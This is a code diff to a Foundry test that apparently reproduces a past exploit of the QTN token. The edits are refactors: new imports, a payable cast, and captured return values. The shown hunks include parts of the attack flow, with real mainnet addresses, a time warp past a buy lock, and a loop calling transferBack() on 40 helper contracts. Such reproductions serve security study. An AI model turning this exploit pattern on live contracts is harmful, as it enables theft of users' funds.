@@ -3,6 +3,9 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 // @Analysis
 // https://twitter.com/BlockSecTeam/status/1615625901739511809
 // @TX
@@ -23,7 +26,7 @@ contract ContractTest is Test {
 
     IERC20 QTN = IERC20(0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IUniswapV2Router Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
     IUniswapV2Pair Pair = IUniswapV2Pair(0xA8208dA95869060cfD40a23eb11F2158639c829B);
     address[] contractList;
 
@@ -36,7 +39,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        address(WETH).call{value: 2 ether}("");
+        (bool success4,) = address(WETH).call{value: 2 ether}("");
         WETHToQTN();
         vm.warp(block.timestamp + 500); // _timeLimitFromLastBuy 5 minutes
         QTNContractFactory();
@@ -61,7 +64,7 @@ contract ContractTest is Test {
 
     function QTNContractBack() internal {
         for (uint256 i; i < 40; ++i) {
-            contractList[i].call(abi.encodeWithSignature("transferBack()"));
+            (bool success5,) = contractList[i].call(abi.encodeWithSignature("transferBack()"));
         }
     }
 
